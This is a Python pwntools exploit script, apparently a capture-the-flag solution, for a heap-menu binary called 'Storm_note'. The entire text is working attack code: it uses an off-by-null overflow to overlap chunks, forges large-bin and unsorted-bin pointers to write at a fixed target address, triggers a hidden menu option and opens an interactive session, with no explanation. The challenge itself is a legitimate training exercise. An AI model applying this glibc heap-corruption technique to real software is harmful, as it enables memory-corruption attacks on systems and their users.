from pwn import *
def cmd(c):
	p.sendlineafter(": ",str(c))
def add(size):
	cmd(1)
	p.sendlineafter(" ?\n",str(size))
def free(idx):
	cmd(3)
	p.sendlineafter(" ?\n",str(idx))
def edit(idx,c):
	cmd(2)
	p.sendlineafter(" ?\n",str(idx))
	p.sendlineafter(": \n",str(c))
p=process("./Storm_note")
#context.log_level='debug'
add(0x500)#0
add(0x88)#1
add(0x18)#2
free(0)
add(0x18)#0
edit(0,"A"*0x18)
add(0x88)#3
add(0x88)#4
free(3)
free(1)


add(0x2d8)#1
add(0x78)#3
add(0x48)#5
add(0x4a9)#6
# now,start to build payload idx=4&5
aim=0x00000000abcd0100
bk=aim-0x20+8
bk_nextsize=aim-0x20-0x18-5

edit(4,p64(0)*7+p64(0x4a1)+p64(0)+p64(bk)+p64(0)+p64(bk_nextsize))#edit the head of LARGECHUNK
edit(5,p64(0)+p64(0x21)*7)
free(4)
edit(5,p64(0)+p64(0x4b1)+p64(0)+p64(aim-0x20))#edit the head & bk of UNSORTEDCHUNK

gdb.attach(p,'')
# if heap != 0x56xxxxxxxx crashed
add(0x48)
edit(4,p64(0)*8+'\x00'*7)
cmd(666)
p.send("\x00"*0x30)

p.interactive()
